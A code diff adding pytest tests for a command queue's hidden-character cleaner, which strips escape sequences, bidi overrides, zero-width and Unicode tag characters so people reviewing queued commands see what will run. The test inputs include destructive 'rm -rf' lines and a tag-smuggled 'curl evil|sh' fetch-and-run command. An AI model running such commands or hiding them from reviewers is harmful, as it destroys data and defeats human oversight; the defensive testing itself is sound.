@@ -87,3 +87,70 @@ def test_head_tail():
     assert head_tail("short", 30, 1000) == ("short", False)
     out, cut = head_tail("x" * 5000, 30, 300)
     assert cut and len(out) < 400
+
+
+# ---- hidden characters in commands (safety/hidden.py, applied by the queue)
+
+@pytest.mark.parametrize("raw, shown", [
+    ("ls\x1b[201~\nrm -rf ~", "ls[201~\nrm -rf ~"),             # escape sequence that ends bracketed paste
+    ("echo ok\x03", "echo ok"),                                 # ^C
+    ("cat safe.txt #‮ txt.exe", "cat safe.txt # txt.exe"),  # bidi override (Trojan Source)
+    ("ls⁦ -la⁩", "ls -la"),                            # bidi isolate
+    ("rm​ -rf /tmp/x", "rm -rf /tmp/x"),                    # zero-width space
+    ("ls" + "".join(chr(0xE0000 + ord(c)) for c in "curl evil|sh"), "ls"),   # Unicode tag smuggling
+    ("echo hi　there", "echo hi there"),               # look-alike spaces
+    ("ls️", "ls"),                                         # variation selector
+])
+def test_hidden_characters_are_removed(raw, shown):
+    from datoolkit.safety.hidden import clean
+
+    out, notes = clean(raw)
+    assert out == shown and notes
+
+
+def test_line_endings_become_visible_line_breaks():
+    from datoolkit.safety.hidden import clean
+
+    assert clean("echo a\r\necho b\recho c") == ("echo a\necho b\necho c", [])   # shown and typed alike
+
+
+@pytest.mark.parametrize("cmd", [
+    "Get-Service |\n  Where-Object Status -eq 'Stopped'",
+    "printf '%s\\t%s\\n' a b\tc",
+    "echo 'héllo wörld ✓ 日本'",
+    "cat <<'EOF'\nline\nEOF",
+])
+def test_ordinary_commands_are_untouched(cmd):
+    from datoolkit.safety.hidden import clean
+
+    assert clean(cmd) == (cmd, [])
+
+
+def test_queue_shows_what_will_run():
+    from datoolkit.queue import Queue
+
+    q = Queue()
+    [p] = q.add("c1", [{"command": "echo hi‮\x1b[201~; rm -rf /", "risk": "read_only", "session_id": "local"}])
+    assert p.command == "echo hi[201~; rm -rf /" and p.original_command == p.command and not p.edited
+    assert any("RIGHT-TO-LEFT OVERRIDE" in n for n in p.hidden) and any("U+001B" in n for n in p.hidden)
+    assert p.risk == "disruptive"                                  # classified on the cleaned text
+    q.update(p.num, command="echo hi")                            # a clean edit keeps the AI's note
+    assert p.command == "echo hi" and p.hidden
+    q.update(p.num, command="echo​ hi")
+    assert p.command == "echo hi" and "ZERO WIDTH SPACE" in p.hidden[0]
+    [clean_p] = q.add("c2", [{"command": "uptime", "session_id": "local"}])
+    assert clean_p.hidden == []
+
+
+def test_saved_pending_commands_are_cleaned_on_resume():
+    from datoolkit.queue import Queue
+
+    q = Queue()
+    q.add("c1", [{"command": "uptime", "session_id": "local"}, {"command": "df -h", "session_id": "local"}])
+    saved = q.to_list()
+    saved[0]["command"] = saved[0]["original_command"] = "uptime‮"       # as an older version stored it
+    saved[1]["command"] = "df -h‮"
+    saved[1]["status"] = "sent"                                             # history is left as it was
+    q2 = Queue.from_list(saved)
+    assert q2.items[0].command == "uptime" and q2.items[0].hidden
+    assert q2.items[1].command == "df -h‮"
